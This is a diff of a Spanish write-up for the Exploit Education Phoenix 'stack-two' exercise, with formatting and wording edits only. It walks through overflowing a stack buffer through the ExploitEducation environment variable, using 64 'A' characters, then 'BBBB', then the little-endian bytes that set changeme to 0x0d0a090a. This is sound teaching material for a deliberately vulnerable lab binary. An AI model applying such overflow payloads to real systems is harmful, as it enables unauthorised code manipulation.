@@ -19,7 +19,7 @@ En **Stack Two** se introduce el uso de variables de entorno y cómo pueden ser 
 
 ## Análisis del código fuente
 
-El objetivo es modificar la variable changeme con el valor 0x0d0a090a. Para lograrlo, el programa copia sin validación el contenido de la variable de entorno ExploitEducation al buffer locals.buffer, lo que abre la puerta a un buffer overflow.
+El objetivo es modificar la variable changeme con el valor **0x0d0a090a** Para lograrlo, el programa copia sin validación el contenido de la variable de entorno ExploitEducation al buffer locals.buffer, lo que abre la puerta a un buffer overflow.
 
 
 ```c
@@ -90,7 +90,7 @@ int main(int argc, char **argv) {
 
 **Ejecución del binario**
 
-Si ejecutamos el binario sin definir la variable de entorno, aparece un mensaje de error:
+Si ejecutamos el binario sin definir la variable de entorno, aparece un mensaje de error que nos dice: Por favor, configure la variable de entorno ExploitEducation.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
@@ -98,7 +98,7 @@ Welcome to phoenix/stack-two, brought to you by https://exploit.education
 stack-two: please set the ExploitEducation environment variable
 ```
 
-Definimos la variable con 64 caracteres de A y con esto ya nos da la respuesta de que la variable está en 0x00000000
+Al definir la variable con 64 caracteres de A vemos que con esto ya nos da la respuesta de que la variable está en **0x00000000**
 
 ```jsx
 user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -111,7 +111,7 @@ Almost! changeme is currently 0x00000000, we want 0x0d0a090a
 
 **Confirmando el overflow**
 
-Si añadimos BBBB (0x42 en ASCII) después de los 64 A, el valor de changeme cambia a 0x42424242: Esto confirma que estamos sobreescribiendo la variable.
+Si añadimos BBBB (0x42 en ASCII) después de los 64 A, el valor de changeme cambia a **0x42424242** esto confirma que estamos sobreescribiendo la variable.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
@@ -122,7 +122,7 @@ Almost! changeme is currently 0x42424242, we want 0x0d0a090a
 ```
 **Explotación**
 
-Ahora sobreescribimos con el valor solicitado 0x0d0a090a, cuidando el endianness (little-endian en x86): \x0A\x09\x0A\x0D y con esto confirmamos que se logra el reto
+Ahora sobreescribimos con el valor solicitado **0x0d0a090a** cuidando el endianness (little-endian en x86): **\x0A\x09\x0A\x0D** y con esto confirmamos que se logra el reto
 
 
 ```c
